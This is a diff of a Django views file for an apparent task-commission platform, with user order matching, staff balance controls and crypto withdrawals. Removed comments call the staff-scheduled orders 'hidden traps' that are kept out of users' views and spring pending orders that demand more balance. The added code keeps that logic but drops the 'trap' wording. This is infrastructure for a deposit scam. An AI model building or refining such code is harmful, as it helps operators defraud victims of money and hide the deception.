@@ -1,77 +1,165 @@
 import random
-from decimal import Decimal
+from decimal import Decimal, InvalidOperation
 from django.shortcuts import render, redirect, get_object_or_404
 from django.contrib.auth.models import User
-from django.contrib.auth.forms import UserCreationForm, AuthenticationForm, SetPasswordForm
+from django.contrib.auth.forms import AuthenticationForm, SetPasswordForm
 from django.contrib.auth import login, logout
 from django.contrib.admin.views.decorators import staff_member_required
 from django.contrib.auth.decorators import login_required
 from django.contrib import messages
-from django.db.models import Q, Sum
+from django.db.models import Q, Sum, Case, When, Value, IntegerField
 from django.db import transaction
-from .models import Profile, Order
-from django.db.models import Case, When, Value, IntegerField
 from django.urls import reverse
+from django.core.paginator import Paginator
+
+from .models import Profile, Order
 from .forms import UserRegistrationForm
 
-# --- 1. GENERAL ---
+# ==========================================
+# 1. GENERAL & AUTHENTICATION
+# ==========================================
+
 def home(request):
     return render(request, 'home.html')
 
-# --- 2. STAFF AUTHENTICATION ---
 def staff_login(request):
     if request.method == 'POST':
         form = AuthenticationForm(request, data=request.POST)
-        if form.is_valid() and form.get_user().is_staff:
-            login(request, form.get_user())
-            return redirect('staffs')
+        if form.is_valid():
+            user = form.get_user()
+            if user.is_staff:
+                login(request, user)
+                return redirect('staffs')
+            else:
+                messages.error(request, "Access denied. Staff only.")
     return render(request, 'staffs/staffs_login.html', {'form': AuthenticationForm()})
 
 def staff_logout(request):
     logout(request)
     return redirect('staff_login')
 
-# --- 3. STAFF DASHBOARD ---
-@staff_member_required(login_url='staff_login')
-def staffs(request):
-    users = User.objects.filter(is_staff=False, is_superuser=False).select_related('profile')
-    task_templates = Order.objects.filter(user__isnull=True).order_by('-created_at')
-    user_logs = Order.objects.filter(user__isnull=False).select_related('user', 'user__profile').order_by('-created_at')
-    
-    search_query = request.GET.get('search', '')
-    if search_query:
-        users = users.filter(Q(username__icontains=search_query) | Q(profile__phone_number__icontains=search_query))
-
-    order_search_query = request.GET.get('order_search', '')
-    if order_search_query:
-        user_logs = user_logs.filter(Q(user__username__icontains=order_search_query))
-
-    total_profit = user_logs.filter(status='completed').aggregate(Sum('profit'))['profit__sum'] or 0
-    
-    return render(request, 'staffs/staffs_main.html', {
-        'users': users, 
-        'task_templates': task_templates,
-        'user_logs': user_logs,
-        'total_profit': total_profit.quantize(Decimal('0.01')),
-        'search_query': search_query,
-        'order_search_query': order_search_query
-    })
-
-# --- 4. STAFF SIDE: USER MANAGEMENT ---
-@staff_member_required(login_url='staff_login')
-def add_user(request):
+def user_login(request):
     if request.method == 'POST':
-        form = UserCreationForm(request.POST)
-        phone = request.POST.get('phone')
+        form = AuthenticationForm(request, data=request.POST)
+        if form.is_valid():
+            login(request, form.get_user())
+            return redirect('user_dashboard')
+    return render(request, 'users/user_login.html', {'form': AuthenticationForm()})
+
+def user_logout(request):
+    logout(request)
+    return redirect('user_login')
+
+def user_register(request):
+    if request.method == 'POST':
+        form = UserRegistrationForm(request.POST)
         if form.is_valid():
             user = form.save()
             profile = user.profile
-            profile.phone_number = phone
+            profile.phone_number = form.cleaned_data.get('phone_number')
             profile.save()
-            messages.success(request, f"User {user.username} created successfully.")
+            messages.success(request, 'Account created!')
+            return redirect('user_login')
+    else:
+        form = UserRegistrationForm()
+    return render(request, 'users/user_register.html', {'form': form})
+
+# ==========================================
+# 2. STAFF DASHBOARD
+# ==========================================
+
+@staff_member_required(login_url='staff_login')
+def staffs(request):
+    u_search = request.GET.get('search', '')
+    t_search = request.GET.get('template_search', '')
+    w_search = request.GET.get('withdrawal_search', '')
+    o_search = request.GET.get('order_search', '')
+    
+    u_page_num = request.GET.get('page', 1)
+    t_page_num = request.GET.get('t_page', 1)
+    w_page_num = request.GET.get('w_page', 1)
+    o_page_num = request.GET.get('log_page', 1)
+
+    # --- 1. USERS TAB ---
+    user_list = User.objects.filter(is_staff=False, is_superuser=False).select_related('profile').order_by('-id')
+    if u_search:
+        user_list = user_list.filter(Q(username__icontains=u_search) | Q(profile__phone_number__icontains=u_search))
+    users_page = Paginator(user_list, 30).get_page(u_page_num)
+
+    # --- 2. TEMPLATES TAB ---
+    template_list = Order.objects.filter(user__isnull=True).order_by('-created_at')
+    if t_search:
+        template_list = template_list.filter(product_name__icontains=t_search)
+    templates_page = Paginator(template_list, 30).get_page(t_page_num)
+
+    # --- 3. WITHDRAWALS TAB ---
+    # Shows strictly financial records: Pending, Success, and Rejected
+    withdrawal_list = Order.objects.filter(
+        status__in=['withdrawal', 'withdrawn', 'rejected']
+    ).select_related('user', 'user__profile').order_by('-created_at')
+    
+    if w_search:
+        withdrawal_list = withdrawal_list.filter(
+            Q(user__username__icontains=w_search) | 
+            Q(user__profile__phone_number__icontains=w_search)
+        )
+    withdrawals_page = Paginator(withdrawal_list, 30).get_page(w_page_num)
+
+    # --- 4. RECORDS TAB (Order Logs) ---
+    # We EXCLUDE all withdrawal-related statuses and 'scheduled' templates
+    # This leaves only: 'pending', 'completed', and 'frozen' tasks
+    log_list = Order.objects.filter(user__isnull=False).exclude(
+        status__in=['withdrawal', 'withdrawn', 'rejected', 'scheduled']
+    ).select_related('user', 'user__profile').order_by('-created_at')
+    
+    if o_search:
+        log_list = log_list.filter(
+            Q(user__username__icontains=o_search) | 
+            Q(user__profile__phone_number__icontains=o_search)
+        )
+    
+    # Calculate profit only from completed task orders
+    total_profit_val = log_list.filter(status='completed').aggregate(Sum('profit'))['profit__sum'] or 0
+    total_profit = Decimal(total_profit_val).quantize(Decimal('0.01'))
+    
+    logs_page = Paginator(log_list, 30).get_page(o_page_num)
+
+    return render(request, 'staffs/staffs_main.html', {
+        'users': users_page,
+        'task_templates': templates_page,
+        'withdrawal_logs': withdrawals_page,
+        'user_logs': logs_page,
+        'total_profit': total_profit,
+        'search_query': u_search,
+        'template_search_query': t_search,
+        'withdrawal_search_query': w_search,
+        'order_search_query': o_search,
+    })
+
+@staff_member_required(login_url='staff_login')
+def delete_order_record(request, order_id):
+    order = get_object_or_404(Order, id=order_id, user__isnull=False)
+    order.delete()
+    messages.success(request, "Order record deleted successfully.")
+    return redirect(f"{reverse('staffs')}?tab=records")
+
+# ==========================================
+# 3. STAFF: USER MANAGEMENT
+# ==========================================
+
+@staff_member_required(login_url='staff_login')
+def add_user(request):
+    if request.method == 'POST':
+        form = UserRegistrationForm(request.POST)
+        if form.is_valid():
+            user = form.save()
+            profile = user.profile
+            profile.phone_number = form.cleaned_data.get('phone_number')
+            profile.save()
+            messages.success(request, f"User {user.username} created.")
             return redirect('staffs')
     else:
-        form = UserCreationForm()
+        form = UserRegistrationForm()
     return render(request, 'staffs/add_user.html', {'form': form})
 
 @staff_member_required(login_url='staff_login')
@@ -96,15 +184,6 @@ def edit_user(request, user_id):
     return render(request, 'staffs/edit_user.html', {'user_to_edit': user_to_edit, 'password_form': password_form})
 
 @staff_member_required(login_url='staff_login')
-def reset_user_orders(request, user_id):
-    user_to_reset = get_object_or_404(User, id=user_id)
-    profile = user_to_reset.profile
-    profile.current_progress = 0
-    profile.save()
-    messages.success(request, f"Progress for {user_to_reset.username} reset to 0.")
-    return redirect('staffs')
-
-@staff_member_required(login_url='staff_login')
 def delete_user(request, user_id):
     get_object_or_404(User, id=user_id).delete()
     return redirect('staffs')
@@ -114,13 +193,28 @@ def adjust_balance(request, user_id):
     if request.method == 'POST':
         user = get_object_or_404(User, id=user_id)
         profile = user.profile
-        amount = Decimal(request.POST.get('amount', '0'))
-        if request.POST.get('action') == 'add': profile.balance += amount
-        else: profile.balance -= amount
+        try:
+            amount = Decimal(request.POST.get('amount', '0'))
+        except InvalidOperation:
+            amount = Decimal('0')
+            
+        if request.POST.get('action') == 'add': 
+            profile.balance += amount
+        else: 
+            profile.balance -= amount
         profile.save()
+        messages.success(request, f"Balance adjusted for {user.username}")
     return redirect('staffs')
 
-# --- 5. STAFF SIDE: ORDER TEMPLATES ---
+@staff_member_required(login_url='staff_login')
+def reset_user_orders(request, user_id):
+    user_to_reset = get_object_or_404(User, id=user_id)
+    profile = user_to_reset.profile
+    profile.current_progress = 0
+    profile.save()
+    messages.success(request, f"Progress for {user_to_reset.username} reset to 0.")
+    return redirect('staffs')
+
 @staff_member_required(login_url='staff_login')
 def add_order_staff(request):
     if request.method == 'POST':
@@ -148,12 +242,11 @@ def delete_order_staff(request, order_id):
     get_object_or_404(Order, id=order_id).delete()
     return redirect('staffs')
 
-# --- 6. STAFF SIDE: TRAP SCHEDULING ---
 @staff_member_required(login_url='staff_login')
 def manual_assign_order(request, user_id):
     target_user = get_object_or_404(User, id=user_id)
     templates = Order.objects.filter(user__isnull=True).order_by('price')
-    scheduled_orders = target_user.orders.filter(scheduled_at__isnull=False).order_by('scheduled_at')
+    scheduled_orders = target_user.orders.filter(status='scheduled').order_by('scheduled_at')
 
     if request.method == 'POST':
         if 'delete_scheduled' in request.POST:
@@ -165,34 +258,23 @@ def manual_assign_order(request, user_id):
                 product_name=template.product_name,
                 price=template.price,
                 commission_rate=template.commission_rate,
-                status='scheduled',  # Hidden trap
+                status='scheduled',
                 scheduled_at=int(request.POST.get('target_num'))
             )
         return redirect('manual_assign_order', user_id=user_id)
     return render(request, 'staffs/manual_assign.html', {'target_user': target_user, 'templates': templates, 'scheduled_orders': scheduled_orders})
 
-# --- 7. USER AUTHENTICATION ---
-def user_login(request):
-    if request.method == 'POST':
-        form = AuthenticationForm(request, data=request.POST)
-        if form.is_valid():
-            login(request, form.get_user())
-            return redirect('user_dashboard')
-    return render(request, 'users/user_login.html', {'form': AuthenticationForm()})
+# ==========================================
+# 5. USER PORTAL & MATCHING
+# ==========================================
 
-def user_logout(request):
-    logout(request)
-    return redirect('user_login')
-
-# --- 8. USER VIEWS ---
 @login_required(login_url='user_login')
 def user_dashboard(request):
     return render(request, 'users/home.html', {'profile': request.user.profile})
 
 @login_required(login_url='user_login')
 def user_order(request):
-    # Strictly exclude hidden traps from the summary view
-    orders = request.user.orders.exclude(status='scheduled').order_by('-created_at')
+    orders = request.user.orders.exclude(status__in=['scheduled', 'withdrawal', 'withdrawn']).order_by('-created_at')
     return render(request, 'users/order.html', {
         'profile': request.user.profile, 
         'orders': orders, 
@@ -202,12 +284,7 @@ def user_order(request):
 
 @login_required(login_url='user_login')
 def user_record(request):
-    profile = request.user.profile
     status_filter = request.GET.get('status')
-    
-    # 1. Exclude 'scheduled' (the hidden traps)
-    # 2. Add a 'priority' number: Pending = 1, Completed = 2
-    # 3. Sort by priority first, then date
     orders = request.user.orders.exclude(status='scheduled').annotate(
         priority=Case(
             When(status='pending', then=Value(1)),
@@ -220,12 +297,8 @@ def user_record(request):
     if status_filter in ['pending', 'completed']:
         orders = orders.filter(status=status_filter)
         
-    return render(request, 'users/record.html', {
-        'profile': profile, 
-        'orders': orders, 
-        'current_status': status_filter
-    })
-# --- 9. MATCHING ENGINE ---
+    return render(request, 'users/record.html', {'profile': request.user.profile, 'orders': orders, 'current_status': status_filter})
+
 @login_required(login_url='user_login')
 def start_matching(request):
     profile = request.user.profile
@@ -234,15 +307,13 @@ def start_matching(request):
         return redirect('user_order')
 
     current_num = profile.current_progress + 1
-
-    # CHECK FOR HIDDEN TRAP
     trap = request.user.orders.filter(status='scheduled', scheduled_at=current_num).first()
+    
     if trap:
-        trap.status = 'pending' # ACTIVATE
+        trap.status = 'pending'
         trap.save()
         return render(request, 'users/confirm_order.html', {'order': trap, 'profile': profile})
 
-    # CHECK FOR EXISTING PENDING
     pending = request.user.orders.filter(status='pending').first()
     if pending:
         return render(request, 'users/confirm_order.html', {'order': pending, 'profile': profile})
@@ -258,82 +329,99 @@ def start_matching(request):
 
     temp = random.choice(templates)
     order = Order.objects.create(
-        user=request.user, 
-        product_name=temp.product_name,
-        price=temp.price, 
-        commission_rate=temp.commission_rate, 
-        status='pending'
+        user=request.user, product_name=temp.product_name,
+        price=temp.price, commission_rate=temp.commission_rate, status='pending'
     )
     return render(request, 'users/confirm_order.html', {'order': order, 'profile': profile})
 
 @login_required(login_url='user_login')
 def complete_order(request, order_id):
     if request.method == 'POST':
-        try:
-            with transaction.atomic():
-                # Get the order and lock it for the update
-                order = get_object_or_404(Order.objects.select_for_update(), id=order_id, user=request.user)
-                profile = request.user.profile
-                
-                # 1. Check if already completed
-                if order.status == 'completed':
-                    messages.info(request, "This order is already completed.")
-                    return redirect('user_order')
+        with transaction.atomic():
+            order = get_object_or_404(Order.objects.select_for_update(), id=order_id, user=request.user)
+            profile = request.user.profile
+            if order.status == 'completed': return redirect('user_order')
+            if profile.balance < order.price:
+                messages.error(request, "Insufficient funds.")
+                return redirect(f"{reverse('user_record')}?status=pending")
 
-                # 2. Check if balance is enough
-                if profile.balance < order.price:
-                    messages.error(request, "Insufficient funds to complete this task. Please top up your balance.")
-                    # Redirect to record page with 'pending' filter
-                    return redirect(f"{reverse('user_record')}?status=pending")
-
-                # 3. Successful Completion Logic
-                # Profit is calculated as (Price * Commission Rate / 100)
-                # Note: In most systems, the user gets their Price back PLUS the profit
-                profile.balance += order.profit 
-                
-                order.status = 'completed'
-                order.save()
-                
-                # Increment progress count
-                profile.current_progress += 1
-                profile.save()
-                
-                messages.success(request, f"Order completed successfully! Profit: ${order.profit}")
-                
-                # RETURN TO SMART MATCH PAGE
-                return redirect('user_order')
-
-        except Exception as e:
-            messages.error(request, "An error occurred while processing the order.")
-            return redirect('user_record')
-
-    # If someone tries to access via GET, send them to records
+            profile.balance += order.profit 
+            order.status = 'completed'
+            order.save()
+            profile.current_progress += 1
+            profile.save()
+            messages.success(request, f"Profit: ${order.profit}")
+            return redirect('user_order')
     return redirect('user_record')
+
+# ==========================================
+# 6. WALLET & CRYPTO WITHDRAWAL
+# ==========================================
 
 @login_required(login_url='user_login')
 def user_wallet(request):
     return render(request, 'users/wallet.html', {'profile': request.user.profile})
 
 @login_required(login_url='user_login')
+def withdraw_funds(request):
+    profile = request.user.profile
+    if request.method == 'POST':
+        try:
+            # Always wrap calculations and inputs in Decimal to prevent float errors
+            amount = Decimal(request.POST.get('amount', '0'))
+        except (InvalidOperation, ValueError):
+            amount = Decimal('0')
+
+        if amount < Decimal('10.00'):
+            messages.error(request, "Minimum withdrawal is $10.00")
+        elif amount > profile.balance:
+            messages.error(request, "Insufficient balance.")
+        else:
+            profile.balance -= amount
+            # Save crypto wallet from post if needed
+            if request.POST.get('wallet_address'):
+                profile.wallet_address = request.POST.get('wallet_address')
+            profile.save()
+            
+            Order.objects.create(
+                user=request.user,
+                product_name=f"Withdrawal ({request.POST.get('network', 'Crypto')})",
+                price=amount, 
+                status='withdrawal'
+            )
+            messages.success(request, "Withdrawal request submitted.")
+            return redirect('user_wallet')
+    
+    return render(request, 'users/withdrawal.html', {'profile': profile})
+
+@staff_member_required(login_url='staff_login')
+def approve_withdrawal(request, order_id):
+    order = get_object_or_404(Order, id=order_id, status='withdrawal')
+    order.status = 'withdrawn'
+    order.save()
+    messages.success(request, f"Withdrawal for {order.user.username} approved.")
+    return redirect(f"{reverse('staffs')}?tab=withdrawals")
+
+@staff_member_required(login_url='staff_login')
+def reject_withdrawal(request, order_id):
+    order = get_object_or_404(Order, id=order_id, status='withdrawal')
+    profile = order.user.profile
+    
+    with transaction.atomic():
+        # 1. Refund the money to user balance
+        profile.balance += order.price
+        profile.save()
+        
+        # 2. Update the record status instead of deleting
+        order.status = 'rejected'
+        order.save()
+    
+    messages.warning(request, f"Withdrawal rejected. ${order.price} refunded to {order.user.username}.")
+    return redirect(f"{reverse('staffs')}?tab=withdrawals")
+
+@login_required(login_url='user_login')
 def user_settings(request):
     return render(request, 'users/settings.html', {'profile': request.user.profile})
 
-
-def user_register(request):
-    if request.method == 'POST':
-        form = UserRegistrationForm(request.POST) # Use custom form
-        if form.is_valid():
-            user = form.save() # This saves the User object
-            
-            # Save the phone number to the Profile
-            phone = form.cleaned_data.get('phone_number')
-            profile = user.profile  # Assuming your Profile model is created via signals
-            profile.phone_number = phone
-            profile.save()
-            
-            messages.success(request, f'Account created! You can now login.')
-            return redirect('user_login')
-    else:
-        form = UserRegistrationForm() # Use custom form
-    
-    return render(request, 'users/user_register.html', {'form': form})
+def error_404_view(request, exception):
+    return render(request, '404.html', status=404)
